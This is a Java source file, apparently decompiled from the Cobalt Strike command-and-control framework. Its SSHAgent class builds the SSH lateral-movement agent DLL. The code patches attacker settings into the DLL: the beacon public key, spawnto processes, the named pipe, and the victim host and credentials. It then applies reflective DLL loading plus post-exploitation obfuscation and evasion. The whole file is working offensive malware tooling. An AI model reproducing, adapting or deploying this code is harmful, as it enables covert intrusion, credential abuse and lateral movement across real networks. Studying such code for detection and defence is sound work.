package beacon.setup;

import beacon.BeaconPayload;
import beacon.BeaconSetup;
import beacon.Settings;
import c2profile.Profile;
import common.CommonUtils;
import common.ReflectiveDLL;
import common.SleevedResource;
import dns.AsymmetricCrypto;
import dns.QuickSecurity;
import pe.PostExObfuscator;

public class SSHAgent {
    protected String host;

    protected int port;

    protected String username;

    protected String password;

    protected String pipename;

    protected boolean pubkey;

    protected String statusp;

    protected BeaconSetup setup;

    protected Profile c2profile;

    public SSHAgent(BeaconSetup beaconSetup, Profile profile,
                    String string1, int n,
                    String string2, String string3, String string4, boolean bl) {
        this.host = string1;
        this.port = n;
        this.username = string2;
        this.password = string3;
        this.pipename = string4;
        this.pubkey = bl;
        this.setup = beaconSetup;
        this.c2profile = profile;
        this.statusp = CommonUtils.garbage("sshagent");
    }

    public String getStatusPipeName() {
        return "\\\\.\\pipe\\" + this.statusp;
    }

    public byte[] export(String string) {
        byte[] arrby;
        if ("x86".equals(string)) {
            arrby = exportSSHStage("resources/sshagent.dll", "x86");
        } else {
            arrby = exportSSHStage("resources/sshagent.x64.dll", "x64");
        }
        arrby = CommonUtils.strrep(arrby, "\\\\.\\pipe\\sshagent", getStatusPipeName());
        if (this.c2profile.option(".post-ex.smartinject")) {
            arrby = PostExObfuscator.setupSmartInject(arrby);
        }
        if (this.c2profile.option(".post-ex.obfuscate")) {
            PostExObfuscator postExObfuscator = new PostExObfuscator();
            postExObfuscator.process(arrby);
            postExObfuscator.enableEvasions();
            arrby = postExObfuscator.getImage();
        }
        return arrby;
    }

    protected byte[] exportSSHStage(String string1, String string2) {
        if (string2.equals("x64")) {
            return ReflectiveDLL.patchDOSHeaderX64(exportSSHDLL(string1));
        }
        return ReflectiveDLL.patchDOSHeader(exportSSHDLL(string1));
    }

    protected byte[] exportSSHDLL(String string) {
        byte[] arrby1 = SleevedResource.readResource(string);
        AsymmetricCrypto asymmetricCrypto = BeaconSetup.beacon_asymmetric();
        Settings settings = new Settings();
        settings.addInt(4, 0x100000);
        settings.addData(7, asymmetricCrypto.exportPublicKey(), 256);
        settings.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
        settings.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
        settings.addString(15, this.pipename, 128);
        settings.addShort(31, QuickSecurity.getCryptoScheme());
        settings.addString(21, this.host, 256);
        settings.addShort(22, this.port);
        settings.addString(23, this.username, 128);
        settings.addInt(37, this.c2profile.getInt(".watermark"));
        if (this.pubkey) {
            settings.addString(25, this.password, 6144);
        } else {
            settings.addString(24, this.password, 128);
        }
        byte[] arrby2 = settings.toPatch(8192);
        arrby2 = BeaconPayload.beacon_obfuscate(arrby2);
        String str = CommonUtils.bString(arrby1);
        int i = str.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
        str = CommonUtils.replaceAt(str, CommonUtils.bString(arrby2), i);
        return CommonUtils.toBytes(str);
    }
}
